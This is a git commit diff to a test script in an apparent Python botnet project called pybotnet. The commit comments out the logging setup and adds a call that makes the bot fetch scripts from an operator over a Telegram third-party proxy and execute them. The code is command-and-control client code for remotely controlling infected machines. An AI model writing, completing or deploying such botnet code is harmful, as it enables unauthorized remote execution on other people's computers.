d963186570d783c9123e0206cad115cc26f471ac
onionj <onionj98@gmail.com>
2021-06-19 08:04:41 -0700

    make sample

--- test.py
+++ test.py
@@ -3,20 +3,19 @@ import util
 import pybotnet
 import logging
 
-show_log = True
+# show_log = False
 
-# logging:
-if show_log:
-    # show all log's
-    log_level = logging.INFO
-else:
-    # off all log's
-    log_level = 100
-my_logger = logging
-my_logger.basicConfig(level=log_level)
-logger = my_logger.getLogger('PyBotNet')
+# # logging:
+# if show_log:
+#     # show all log's
+#     log_level = logging.INFO
+# else:
+#     # off all log's
+#     log_level = 100
+# my_logger = logging
+# my_logger.basicConfig(level=log_level)
+# logger = my_logger.getLogger('PyBotNet')
 
 
-bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=show_log)
-
-print(bot.get_last_command_by_third_party_proxy())
+bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=True)
+bot.get_and_execute_scripts_by_third_party_proxy()
